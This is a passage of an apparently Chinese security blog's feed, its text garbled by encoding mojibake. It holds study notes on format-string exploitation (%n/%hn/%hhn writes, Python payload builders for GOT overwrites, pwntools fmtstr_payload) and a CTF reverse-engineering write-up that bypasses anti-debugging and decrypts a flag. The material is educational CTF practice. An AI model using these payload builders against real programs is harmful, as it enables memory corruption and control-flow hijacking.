title="ä»»æ„åœ°å€è¦†ç›–"></a>ä»»æ„åœ°å€è¦†ç›–</h4><ul><li>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼äº%sçš„ä»»æ„åœ°å€è¯»å–ï¼Œåªæ˜¯æ¢æˆäº†%nã€‚</li><li>ä½¿ç”¨%xcçš„åŠæ³•æ¥æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚<br>åŸºæœ¬æ ¼å¼ï¼š <code>....[overwrite addr]....%[overwrite offset]$n</code><br>å…¶ä¸­<code>....</code> è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œ<code>overwrite addr</code> è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œ<code>overwrite offset</code> åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¹Ÿå°±æ˜¯æ„é€ ä¸€ä¸ªéœ€è¦å†™å…¥çš„addressï¼Œç„¶åç”¨%xxcæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦æ•°ï¼Œç„¶åæŠŠæ¡å¥½åç§»ã€‚</li></ul><h5 id="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"><a href="#fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°" class="headerlink" title="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"></a>fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°</h5><p>å› ä¸º%nåœ¨ä¸€æ¬¡çš„å†™å…¥æ˜¯åœ¨ä¸€æ¬¡å½“ä¸­å†™å…¥intå¤§å°çš„æ•´æ•°ï¼Œå½“ä½¿ç”¨%xcæ¥æ§åˆ¶è¾“å‡ºä¸€ä¸ªintå¤§å°çš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™ä¸ªprintfå‡½æ•°ä¼šè¾“å‡ºååˆ†å¤§çš„å­—ç¬¦æ•°é‡ï¼Œè¿™ä¸ªç»“æœå¯¹æˆ‘ä»¬è¯´ååˆ†ä¸åˆ©çš„ï¼Œä¸€æ–¹é¢è¿œç«¯ç¨‹åºè¾“å‡ºä»¥åï¼Œè‡ªå·±æ¥æ”¶æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ˜¯ååˆ†ä¸ç¨³å®šçš„ï¼Œå¹¶ä¸”æ— æ³•ç²¾å‡†çš„æ§åˆ¶éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ã€‚<br>æ‰€ä»¥å¸¸ç”¨çš„æ˜¯%hn å’Œ%hhnï¼Œåˆ†åˆ«å†™å…¥shortå’Œcharå¤§å°çš„æ•´æ•°ï¼Œç„¶ååˆ†æˆå¤šæ¬¡å†™å…¥ä»¥ç»„åˆæˆå®Œæ•´çš„intæ•´æ•°ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ååˆ†ç¨³å®šçš„ã€‚</p><h5 id="å•æ¬¡printfå¤šæ¬¡å†™å…¥"><a href="#å•æ¬¡printfå¤šæ¬¡å†™å…¥" class="headerlink" title="å•æ¬¡printfå¤šæ¬¡å†™å…¥"></a>å•æ¬¡printfå¤šæ¬¡å†™å…¥</h5><p>åœ¨è¿›è¡ŒGOT hijackæˆ–è€…æ”¹æ‰æŸä¸€ä¸ªæŒ‡æ ‡çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šè¦æ±‚ä¸€æ¬¡printfå†…å°±è¦æ¥æ”¹å†™å®Œæˆï¼Œä¸ç„¶æ”¹ä¸€åŠçš„å€¼è¿™ä¸ªæŒ‡æ ‡å†è¢«ä½¿ç”¨æ—¶ç¨‹åºå¾ˆå®¹æ˜“å´©æºƒã€‚<br>æ‰€ä»¥å°±å¯ä»¥æŠŠå¤šä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆåœ¨ä¸€æ¬¡ï¼Œä¾‹å¦‚ï¼š</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>ä½†è¿™æ ·å°±è¯´éœ€è¦å°å¿ƒåç§»ï¼Œå¹¶ä¸”è¾“å‡ºçš„å­—ç¬¦æ•°ä¹Ÿè¦æ§åˆ¶å¥½ã€‚éš¾ç‚¹ä¹Ÿåœ¨æ§åˆ¶è¿™ä¸ªå¤šæ¬¡å†™å…¥æ—¶ï¼Œcå‰é¢åº”è¯¥å¡«å¤šå°‘çš„å€¼ã€‚</p><h5 id="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"><a href="#å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°" class="headerlink" title="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"></a>å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°</h5><p>è¦æ³¨æ„çš„æ˜¯<strong>%nå†™å…¥çš„å€¼æ˜¯å…¶å‰é¢è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚</strong></p><ol><li><p>ç¬¬ä¸€æ¬¡%xc%hhnçš„æ—¶å€™ï¼Œè¦æ‰£æ‰å‰é¢æ‘†æ”¾çš„addressçš„é•¿åº¦ã€‚æ¯”å¦‚32ä½æ—¶ï¼Œå…¶å‰é¢ä¼šæ‘†æ”¾4ä¸ªåœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯xéœ€è¦å‡å»4x4 = 16.</p></li><li><p>ä¹‹åæ¯ä¸ª%xc å¿…éœ€æ‰£æ‰å‰ä¸€ä¸ªå†™å…¥ byte çš„å€¼æ€»å­—ç¬¦æ•°æ‰ä¼šæ˜¯è¿™ä¸ªå†™å…¥éœ€è¦çš„é•¿åº¦ã€‚æ¯”å¦‚ ç¬¬ä¸€æ¬¡å†™å…¥å€¼ä¸º 90 ç¬¬äºŒä¸ªå†™å…¥ 120 æ­¤æ—¶åº”ä¸º<code>%30c% offset$hhn</code></p></li><li><p>å½“æŸä¸€æ¬¡å†™å…¥çš„å€¼æ¯”å‰é¢å†™å…¥çš„è¦å°çš„æ—¶å€™ï¼Œå°±éœ€è¦æ•´æ•°overflowå›æ¥ã€‚æ¯”å¦‚ï¼šéœ€è¦å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨çš„æ˜¯hhnçš„æ—¶å€™ï¼Œå‰é¢é‚£æ¬¡å†™å…¥çš„æ˜¯0x80ï¼Œè¿™æ¬¡å†™å…¥çš„æ˜¯0x50ï¼Œè¿™æ—¶å€™å°±ç”¨0x50å¯ä»¥åŠ ä¸Š0x100ï¼ˆ256ï¼‰=0x150 ï¼ˆè¿™æ—¶å€™å› ä¸ºæ˜¯hhnï¼Œåœ¨æˆªå–çš„æ—¶å€™å°±æ˜¯æˆªå–çš„0x50ï¼‰ï¼Œ å†å‡å»0x80 = 0xD0ï¼ˆ208ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¡«å…¥%208c%offset$hhnå³å¯ã€‚</p></li></ol><p>å½“ç„¶è¿™ä¹Ÿæ˜¯å¾ˆè§„å¾‹çš„ï¼Œåœ¨æ§åˆ¶ä¸€ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼Œå°±åˆ†ä¸º3ç§æƒ…å†µï¼š</p><ul><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å°äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ç­‰äºäºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å¤§äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li></ul><p>ç„¶åå°±å¯ä»¥å†™æˆä¸€ä¸ªè„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–æ§åˆ¶è¿™ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼š</p><p>å•å­—èŠ‚ï¼š</p><pre><code class="python"># prev å‰é¢å·²ç»è¾“å‡ºå¤šå°‘å­—ç¬¦# val è¦å†™å…¥çš„å€¼# idx  åç§»def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#æ­é…ï¼šprev = 0 payload = &quot;&quot;# xå°±æ˜¯ä½ è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚åœ¨æ”¹å†™64ä½gotæ—¶å¸¸ç”¨æ˜¯6ï¼Œå› ä¸ºå…¶å‰ä¸¤ä¸ªå­—èŠ‚éƒ½ä¸€æ ·# idxæ˜¯åç§»ï¼Œkeyæ˜¯è¦å†™å…¥çš„ç›®æ ‡å€¼for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>åŒå­—èŠ‚ï¼š</p><pre><code class="python">#è·Ÿä¸Šä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯æ”¹äº†éƒ¨åˆ†åœ°æ–¹def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„<strong>æ˜¯åœ¨è·å–åˆ°payloadçš„æ—¶å€™ä¹Ÿç”¨<code>payload.ljust()</code>åšå¥½padding,æ¥æ§åˆ¶å¥½å­—èŠ‚å¯¹é½ï¼Œç„¶åå†æ‘†ä¸Šéœ€è¦å†™å…¥xç»„çš„åœ°å€ã€‚ï¼ˆä¸€ä¼šåœ¨é¢˜ç›®ä¸­ä¼šæœ‰æ¼”ç¤ºï¼‰</strong></p><h5 id="pwntools-pwnlib-fmtstr-æ¨¡å—"><a href="#pwntools-pwnlib-fmtstr-æ¨¡å—" class="headerlink" title="pwntools pwnlib.fmtstr æ¨¡å—"></a>pwntools pwnlib.fmtstr æ¨¡å—</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):ä½ æ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡</li><li>writes (dict):æ ¼å¼ä¸º {addr: value, addr2: value2},ç”¨äºå¾€ addr é‡Œå†™å…¥ value (å¸¸ç”¨:<code>{printf_got}</code>)</li><li>numbwritten (int):å·²ç»ç”± printf å‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°</li><li><code>write_size (str)</code>:å¿…é¡»æ˜¯ byte,short æˆ– intã€‚é™åˆ¶ä½ æ˜¯è¦é€ byte å†™,é€ short å†™è¿˜æ˜¯é€ int å†™(hhn,hnæˆ–n)</li></ul><p>è¿™ä¸ªå‡½æ•°æ˜¯ååˆ†å¥½ç”¨çš„ï¼Œå…·ä½“å¯ä»¥å»çœ‹ä¸€ä¸‹pwntoolsçš„å®˜æ–¹ä»‹ç»ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨å½“ä¸­ï¼Œä¼šå‘ç°å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>åœ¨64ä½ä¸­ï¼Œå¹¶ä¸å¥½ç”¨ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„payloadä¸­ï¼Œå®ƒä¸ä¼šå°†åœ°å€æ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åï¼Œå¯¼è‡´ç”¨ä¸äº†ã€‚</li><li>åœ¨é¢å¯¹å•æ¬¡printfï¼Œå®æ–½å¤šæ¬¡å†™å…¥çš„æ—¶å€™å…¶æ›´æ˜¾çš„ååˆ†æ— åŠ›ã€‚</li></ul><p>è®°å½•åˆ°è¿™é‡Œï¼Œç†è®ºéƒ¨åˆ†å°±å·®ä¸å¤šå®Œäº†ï¼Œä¸‹ä¸€ç¯‡ä¸»è¦è®°å½•çš„å°±æ˜¯é¢˜è§£ç¯‡ï¼Œä¼šåŒ…å«ä¸€äº›æŠ€å·§ï¼Œå¸¸è§çš„ctfæ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®æ¼æ´åˆ©ç”¨çš„å¸¸è§å¥—è·¯ï¼Œè¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é«˜çº§åˆ©ç”¨ï¼ˆå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„bufåœ¨bssä¸Šï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾€æ ˆä¸Šå†™åœ°å€ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå¹¶ä¸”è¿™ç§é¢˜ç›®å¸¸åœ¨èµ›é¢˜ä¸­å‡ºç°ï¼‰</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰&quot;&gt;&lt;a href=&quot;#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰&quot; class=&quot;headerlink&quot; title=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰&quot;&gt;&lt;/a&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="å­¦ä¹ è®°å½•" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_é«˜æ ¡æˆ˜ç–«èµ›\_RE-å¤©æ´¥å“</title>
    <link href="http://chumen77.xyz/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>http://chumen77.xyz/2020/03/11/XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“/</id>
    <published>2020-03-11T13:06:03.000Z</published>
    <updated>2020-08-10T07:31:37.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“"><a href="#XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“" class="headerlink" title="XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_"></a>XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ç°ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶åªåšå‡ºæ¥ç¬¬ä¸€å±‚åŠ å¯†ã€‚å› ä¸ºè¿˜æ²¡æ€ä¹ˆæ¥è§¦åè°ƒè¯•è·Ÿä»£ç æ··æ·†ï¼Œåšä¸ä¸‹å»äº†ï¼Œä¸è¿‡ä¸‹æ¥å¤ç°å‘ç°äº†è¾ƒä¸ºç®€å•çš„åŠæ³•å‡ºæ¥è¿™ä¸ªé¢˜ï¼Œä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åˆæ­¥è¿è¡Œ"><a href="#åˆæ­¥è¿è¡Œ" class="headerlink" title="åˆæ­¥è¿è¡Œ"></a>åˆæ­¥è¿è¡Œ</h2><p>å‘ç°è¿˜éœ€è¦è£…ä¸ªcgwin1.dllï¼Œè¿™ä¸ªå¾ˆå¥½æ‰¾ï¼Œä¸è¿‡è¦æ³¨æ„64ä½ç³»ç»Ÿï¼Œwindowsç›®å½•ä¸‹çš„system32 è·Ÿsyswow64éƒ½è¦æ”¾å…¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>çœ‹æ¥æ˜¯éœ€è¦è¾“å…¥åˆ¤æ–­ã€‚</p><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€å±‚éªŒè¯äº†ï¼Œåæ¥äº†è§£åˆ°è¿™ä¸ªæ˜¯smcåŠ å¯†ï¼Œæˆ‘æ˜¯ç›´æ¥å†™Pythonä¸€ä½ä½çˆ†ç ´å‡ºæ¥çš„ã€‚</p><pre><code class="python">v39 = &#39;Rising_Hopper!&#39;result = &#39;&#39;key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16]tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21]for i in range(len(key)):    x = 0    flag = 1    while flag:        if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] :            flag = 0            result += chr(x)        else:            x += 1print(result)#result = &#39;Caucasus@s_ability&#39;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°è¿™é‡Œæ ¹æ®åˆšåˆšè§£å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œä¼ å…¥åå¯¹*<em>Unk_10040164D *</em> åšäº†ä¸€äº›å¤„ç†ç„¶ååˆè¿”å›åˆ°è¿™å †æ•°æ®ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·Ÿè¿›å»æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ã€‚æ‰€ä»¥éœ€è¦åŠ¨æ€è°ƒè¯•ï¼Œçœ‹çœ‹ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œï¼Œæ˜¯æ€ä¹ˆæ ·çš„ã€‚</p><p>ç„¶åä¼šå‘ç°ï¼ŒidaåŠ¨æ€è°ƒè¯•ç›´æ¥æ–­æ‰äº†ï¼Œè‚¯å®šæ˜¯æœ‰åè°ƒè¯•äº†ã€‚x64å¯ä»¥è°ƒè¯•ï¼Œä½†æ˜¯å®šä½å…³é”®å¤„æœ‰ç‚¹éš¾ï¼Œå¹¶ä¸”çœ‹æ±‡ç¼–ä»£ç ä¹Ÿè®©è‡ªå·±è¿™ä¸ªèœé¸¡çœ‹åäº†ã€‚æ‰€ä»¥å°±æƒ³åŠæ³•ç ´é™¤å¯¹idaçš„åè°ƒè¯•ï¼Œç„¶ååˆ°äº†å…³é”®ä»£ç ä¹Ÿå°±æ˜¯å¤„ç†ä»¥åçš„Unk10040164Dï¼Œçœ‹çœ‹é€»è¾‘æ˜¯ä¹Ÿæƒ³åŠæ³•<strong>å°†å…¶æ”¹å˜æˆä¼ªä»£ç </strong>ï¼Œè¿™æ ·å°±å¥½åˆ†æå¤šäº†ã€‚</p><h3 id="patchç¨‹åº"><a href="#patchç¨‹åº" class="headerlink" title="patchç¨‹åº"></a>patchç¨‹åº</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>è·Ÿè¿›å…¥å¼•ç”¨å‡½æ•°ï¼Œå‘ç°æ˜¯åˆ©ç”¨çª—å£äº‹ä»¶æ¥æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•å™¨è°ƒè¯•ã€‚å¹¶ä¸”åœ¨å…¶ä¸­ä¹Ÿå‘ç°äº†idaï¼Œè¿™é‡Œpatchç¨‹åºå¯ä»¥ç”¨<strong>010editor</strong>ï¼Œç›´æ¥æŠŠidaçš„ç›¸å…³å­—çœ¼æ”¹æˆå…¶ä»–çš„å°±è¡Œã€‚ä½†æ˜¯è¦æ³¨æ„ä¸è¦ç ´åå…¶ä»–çš„æ•°æ®ï¼š<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>æˆ‘èµ·åˆæ”¹æˆè¿™æ ·å°±ä¸è¡Œï¼Œä½ä½å¯¹é½ï¼Œæ”¹æˆå…¶ä»–å­—ç¬¦ä¸²å°±å¥½äº†ã€‚</p><h3 id="idaåŠ¨æ€è°ƒè¯•ï¼š"><a href="#idaåŠ¨æ€è°ƒè¯•ï¼š" class="headerlink" title="idaåŠ¨æ€è°ƒè¯•ï¼š"></a>idaåŠ¨æ€è°ƒè¯•ï¼š</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>æ–­åœ¨è¿™é‡Œï¼Œç„¶åè¿›å…¥è¿™å…¥Unk10040164D å‡½æ•°çš„æ—¶å€™ï¼ŒF7è¿›å…¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»æœ‰æ­£å¸¸çš„æ±‡ç¼–ä»£ç å‡ºæ¥äº†ï¼ˆè¿™é‡Œæˆ‘çš„æ˜¯å·²ç»ä¿®æ”¹è¿‡çš„ï¼‰ï¼Œæ— æ³•f5åç¼–è¯‘ï¼Œè¿™æ—¶å€™å¯ä»¥åœ¨æœ€åˆæ®µpush rbp ä¸Šé¢ï¼Œå³é”®æ–°å»ºä¸€ä¸ªå‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>æ•´å®Œçš„æ ·å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±å¯ä»¥f5åç¼–è¯‘äº†ï¼Œå¹¶ä¸”å¾ˆæ¸…æ™°çš„å°±å¯ä»¥çœ‹å‡ºç¨‹åºé€»è¾‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>ç„¶åè§£å¯†è¿™é‡Œï¼š</p><pre><code class="python">flag = &#39;&#39;key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375]for i in range(51) :    flag += chr(int(key[i] / 19683))print(flag)</code></pre><p>ç„¶åå°±æ‹¿åˆ°flagäº†ã€‚æ¯”èµ·å¾ˆå¤šå¤§å¸ˆå‚…çš„dumpæ ¸å¿ƒä»£ç ï¼Œå†è¿›è¡Œåˆ†æï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤ªéš¾äº†ã€‚æ„Ÿè§‰åœ¨idaé‡Œåˆ°å…³é”®å¤„ï¼Œåˆ›å»ºå‡½æ•°ï¼Œç”Ÿæˆä¼ªä»£ç æ›´ç®€å•ï¼Œä¹Ÿå¾ˆæ¸…æ™°ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“&quot;&gt;&lt;a href=&quot;#XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“&quot; class=&quot;headerlink&quot; title=&quot;XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_&quot;&gt;&lt;/a&gt;XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_&lt;/h1&gt;&lt;h2 id=&quot;å‰
      
    
    </summary>
    
    
      <category term="RE" scheme="http://chumen77.xyz/tags/RE/"/>
    
  </entry>
  
</feed>
